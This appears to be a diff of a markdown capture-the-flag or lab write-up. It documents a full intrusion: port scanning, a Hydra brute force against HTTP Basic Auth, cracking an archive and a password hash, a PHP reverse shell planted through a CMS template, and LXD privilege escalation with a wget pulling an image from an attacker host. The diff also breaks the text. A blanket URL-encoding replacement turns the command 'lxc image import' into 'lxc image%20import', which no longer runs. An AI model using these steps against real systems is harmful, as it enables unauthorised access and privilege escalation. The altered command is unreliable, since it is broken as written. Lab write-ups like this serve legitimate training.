@@ -8,7 +8,7 @@
 
 We started by performing an Nmap scan against the target.
 
-![[Pasted image 20260706213325.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706213325.png)
 
 ---
 
@@ -16,7 +16,7 @@ We started by performing an Nmap scan against the target.
 
 Next, we performed version detection and executed Nmap scripts to gather additional information about the running services.
 
-![[Pasted image 20260706213350.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706213350.png)
 
 ---
 
@@ -26,7 +26,7 @@ We used **Gobuster** to discover hidden files and directories on the web server.
 
 Initially, no interesting resources were found.
 
-![[Pasted image 20260706213558.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706213558.png)
 
 ---
 
@@ -34,7 +34,7 @@ Initially, no interesting resources were found.
 
 After adding common file extensions to the wordlist, we discovered an interesting text file.
 
-![[Pasted image 20260426201929.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426201929.png)
 
 ---
 
@@ -42,7 +42,7 @@ After adding common file extensions to the wordlist, we discovered an interestin
 
 The text file contained several usernames that could be useful for later attacks.
 
-![[Pasted image 20260426202027.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426202027.png)
 
 ---
 
@@ -54,7 +54,7 @@ We performed another Nmap scan against **all TCP ports** and discovered an addit
 8080
 ```
 
-![[Pasted image 20260706214619.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706214619.png)
 
 ---
 
@@ -62,7 +62,7 @@ We performed another Nmap scan against **all TCP ports** and discovered an addit
 
 Browsing to port **8080** revealed a page protected with **HTTP Basic Authentication**.
 
-![[Pasted image 20260426211130.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211130.png)
 
 ---
 
@@ -74,7 +74,7 @@ Using one of the previously discovered usernames, we performed a brute-force att
 hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.130.166.31 -s 8080 http-get /
 ```
 
-![[Pasted image 20260426211158.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211158.png)
 
 ---
 
@@ -82,7 +82,7 @@ hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.130.166.31 -s 8080 http-ge
 
 After authenticating, we used **Nikto** to gather additional information about the web application.
 
-![[Pasted image 20260426211456.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211456.png)
 
 ---
 
@@ -90,11 +90,11 @@ After authenticating, we used **Nikto** to gather additional information about t
 
 Nikto identified an interesting file.
 
-![[Pasted image 20260426211828.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211828.png)
 
 We examined its contents.
 
-![[Pasted image 20260706214800.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706214800.png)
 
 ---
 
@@ -102,7 +102,7 @@ We examined its contents.
 
 The file revealed the existence of a login page.
 
-![[Pasted image 20260426211904.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211904.png)
 
 ---
 
@@ -110,11 +110,11 @@ The file revealed the existence of a login page.
 
 Nikto also identified another downloadable file.
 
-![[Pasted image 20260426211935.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426211935.png)
 
 We downloaded it for further analysis.
 
-![[Pasted image 20260706214939.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706214939.png)
 
 ---
 
@@ -122,7 +122,7 @@ We downloaded it for further analysis.
 
 Attempting to extract the archive showed that it was password protected.
 
-![[Pasted image 20260426213111.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426213111.png)
 
 ---
 
@@ -130,11 +130,11 @@ Attempting to extract the archive showed that it was password protected.
 
 We converted the archive into a crackable hash.
 
-![[Pasted image 20260706215113.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260706215113.png)
 
 Then cracked it using John the Ripper.
 
-![[Pasted image 20260426213226.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426213226.png)
 
 ---
 
@@ -142,7 +142,7 @@ Then cracked it using John the Ripper.
 
 Inside the extracted files, we found a database containing a username and a password hash.
 
-![[Pasted image 20260426214104.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426214104.png)
 
 ---
 
@@ -150,7 +150,7 @@ Inside the extracted files, we found a database containing a username and a pass
 
 We cracked the hash to recover the plaintext password.
 
-![[Pasted image 20260707162321.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260707162321.png)
 
 ---
 
@@ -158,7 +158,7 @@ We cracked the hash to recover the plaintext password.
 
 Using the recovered credentials, we successfully logged into the web application.
 
-![[Pasted image 20260426214210.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426214210.png)
 
 ---
 
@@ -172,7 +172,7 @@ Extensions → Templates → index.php
 
 This allowed us to modify the template and upload PHP code.
 
-![[Pasted image 20260426214604.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426214604.png)
 
 ---
 
@@ -180,7 +180,7 @@ This allowed us to modify the template and upload PHP code.
 
 After uploading the PHP payload, we accessed the modified page to execute the code and obtained a reverse shell.
 
-![[Pasted image 20260426214847.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426214847.png)
 
 ---
 
@@ -188,7 +188,7 @@ After uploading the PHP payload, we accessed the modified page to execute the co
 
 After gaining shell access, we discovered that the compromised user belonged to the **LXD** group.
 
-![[Pasted image 20260426215043.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260426215043.png)
 
 Since members of the **LXD** group can create privileged containers, we used the well-known **LXD privilege escalation** technique.
 
@@ -196,7 +196,7 @@ Since members of the **LXD** group can create privileged containers, we used the
 
 # On the Attacker Machine
 
-Clone the Alpine image builder:
+Clone the Alpine image%20builder:
 
 ```bash
 git clone https://github.com/saghul/lxd-alpine-builder.git
@@ -225,7 +225,7 @@ wget http://<attacker-ip>:8000/alpine-v3.10-x86_64-<timestamp>.tar.gz -P /tmp
 Import the image:
 
 ```bash
-lxc image import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
+lxc image%20import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
 ```
 
 Create a privileged container:
